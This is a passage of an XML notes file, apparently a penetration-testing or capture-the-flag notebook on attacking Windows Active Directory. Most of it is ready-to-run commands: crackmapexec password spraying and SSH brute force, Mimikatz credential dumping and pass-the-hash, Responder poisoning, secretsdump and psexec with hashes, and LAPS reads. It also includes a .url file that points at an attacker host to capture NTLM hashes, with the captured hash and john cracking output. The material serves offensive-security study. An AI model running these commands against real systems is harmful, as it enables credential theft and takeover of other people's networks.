 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 


</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2">Checking if winrm works</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once confirmed simply run:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
  
  
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or chacking all the password and continuing on success:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________-


Grabbing the Laps password

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

______________________________


</rich_text>
          <rich_text scale="h2">SSH Brute Force</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 10.10.10.58 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.10.10.58 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 --shares -u '' -p ''</codebox>
          <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.10.58 -u users.txt -H hashes.txt</codebox>
          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.58 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 -u validuser.txt -p password.txt -M spider-plus </codebox>
          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.10.10.58  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.58 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.58 -M laps</codebox>
          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.58 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1698807551">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else

____________________________________________________


using Powershell to run sharphound/bloodhound on target machine

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

OR 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all


_________________________________________________________________________________________


</rich_text>
          <rich_text scale="h2">Running the console</rich_text>
          <rich_text>

To view all the json files generated by the commands above :

1.  Start bloodhound via : </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
2. Start neo4j console: </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
3.  Use Default password as neo4j/neo4j

4. Upload all the Json Files or drop the zip file

5. First always check the pwned users and mark them owned before checking anything else

6.Click on the left side and click on Analysis
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


7. Select : </rich_text>
          <rich_text weight="heavy">Shortest Paths to High Value Targets</rich_text>
          <rich_text>  see that view
 
8. Check the machine u have access to and see the shortest path. or path from owned users and select Domain Admin

9. click on the joining arrows, select help and then abuse to see how it can be achieved
   
</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.10.58</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
Import-Module ./SharpHound.ps1&#13;
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
          <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.58 -d support.htb -u 'ldap' -p 'password'</codebox>
          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.58 -d htb.local -gc forest.htb.local</codebox>
          <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.58 -d support.htb -u 'ldap' -p 'password' -c all</codebox>
          <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
          <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
          <encoded_png char_offset="1302" justification="left" link="webs https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e.png"></encoded_png>
        </node>
        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1696109791">
          <rich_text scale="h3">Using Ldapsearch</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or 

Without any user:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
          <rich_text weight="heavy">Passwords</rich_text>
          <rich_text> via :
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2.  </rich_text>
          <rich_text weight="heavy">Usernames</rich_text>
          <rich_text> Via:
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_________________________________________________________________


</rich_text>
          <rich_text scale="h2">To check for admin</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.10.10.58 -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
          <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.58</codebox>
          <codebox char_offset="50" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.10.10.58 | tee ldapSearch.log  </codebox>
          <codebox char_offset="133" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
          <codebox char_offset="157" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log

or

grep 'userPrincipalName:' ldapsearch/ldapSearch_Guest.log   </codebox>
          <codebox char_offset="249" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.58 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd</codebox>
        </node>
        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
          <rich_text scale="h1">
LLMNR/NBT-NS/mDNS Poisoner


</rich_text>
          <rich_text scale="h2">Basic Usage:</rich_text>
          <rich_text>

Run:

sudo responder -I tun0
or 


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


And then made victim perform actions (send queries via ssrf) to posion
When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.

Reference:
</rich_text>
          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
        </node>
        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689286554">
          <rich_text>

</rich_text>
          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
          <rich_text>


</rich_text>
          <rich_text link="node 95">evilwinrm</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where u make sure the hash is the second part of  the hash:

ex: 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h2">Option</rich_text>
          <rich_text>


If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

now if u have PowerView.ps1 on ur local kali/attacker machine u can run it directly on windows system


References:
1. </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
          <rich_text>
2. </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
          <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.10.58</codebox>
          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.58 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.58 -u anirudh -p "SecureHM" -s .</codebox>
        </node>
        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
          <rich_text>
</rich_text>
          <rich_text scale="h2">URI File Attack</rich_text>
          <rich_text>
&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
&#13;We'll create a file named @hax.url with the following contents.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Next, let's upload our file.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat @hax.url &#13;
[InternetShortcut]&#13;
URL=anything&#13;
WorkingDirectory=anything&#13;
IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
IconIndex=1</codebox>
          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ sudo responder -I tun0 -v&#13;
...&#13;
[+] Listening for events...&#13;
...</codebox>
          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
smb: \&gt; put @hax.url &#13;
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
smb: \&gt; quit&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$&#13;

&#13;After a little while, responder captures a hash.
&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1ccodebox>
          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat hash.txt &#13;
anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
Using default input encoding: UTF-8&#13;
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
Will run 4 OpenMP threads&#13;
Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
SecureHM         (anirudh)     &#13;
1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
Session completed. </codebox>
        </node>
        <node name="Powerview" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696729392" ts_lastsave="1696730835">
          <rich_text>USing powerview

Download it:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Start power shell first:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Usage:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

To start PowerView

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

ref: </rich_text>
          <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/">https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/</rich_text>
          <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</codebox>
          <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe</codebox>
          <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
          <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
        </node>
        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146362">
          <rich_text>check the Forest writeup for priv esc

</rich_text>
          <rich_text link="webs https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough">https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
          <rich_text>



PS:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u get the hash use it
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.10.10.58</codebox>
          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.58 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
          <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
        </node>
        <node name="RPCClient" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698812150" ts_lastsave="1698812302">
          <rich_text>

</rich_text>
          <rich_text link="webs https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="75" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">rpcclient 10.10.10.58 -U support</codebox>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 10.10.10.58
   ☐  nmap -sL 10.10.10.58
   ☐  nbtscan -r 10.10.10.58

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 10.10.10.58
   ☐  nmap -sU 10.10.10.58
</rich_text>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.10.10.58</codebox>
